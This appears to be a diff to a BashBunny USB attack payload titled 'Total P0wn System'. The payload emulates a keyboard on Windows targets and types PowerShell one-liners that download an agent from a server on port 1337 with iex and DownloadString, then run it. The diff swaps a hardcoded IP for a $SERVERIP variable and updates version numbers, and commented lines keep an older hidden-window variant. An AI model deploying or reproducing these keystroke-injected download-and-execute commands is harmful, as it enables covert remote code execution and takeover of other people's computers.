@@ -2,11 +2,11 @@
 # Title:		BashBunny Total P0wn System
 # Description:		Delivers an agent that can run multiple Powershell Payloads
 # Author:		PoSHMagiC0de
-# Version:		0.8
+# Version:		1.0.0
 # Category:		Tools
 # Target:		Windows 7+, Powershell 3.0+
 # Attackmodes:		HID, Ethernet
-# BashBunny Firmware:	1.1
+# BashBunny Firmware:	1.2
 #
 # LED DESCRIPTIONS
 # Solid Magenta		Attackmode initialization for both HID and Ethernet
@@ -44,12 +44,12 @@ Q ENTER
 if [ $DEBUG ]; then
     ### Old Powershell command
     # Q STRING "powershell -NonI -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337 -verbose\""
-    Q STRING "powershell -NonI -Nop -C \"\$p='192.168.1.136';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337 -verbose;exit}}else{\$ic++}sleep -s 2}\""
+    Q STRING "powershell -NonI -Nop -C \"\$p='$SERVERIP';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337 -verbose;exit}}else{\$ic++}sleep -s 2}\""
     Q ENTER
 else
     ### Old Powershell command
     # Q STRING "powershell -NonI -W Hidden -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337\""
-    Q STRING "powershell -NonI -Nop -C \"\$p='192.168.1.136';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337;exit}}else{\$ic++}sleep -s 2}\""
+    Q STRING "powershell -NonI -Nop -C \"\$p='$SERVERIP';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337;exit}}else{\$ic++}sleep -s 2}\""
     Q ENTER
 fi
 Q DELAY 1000
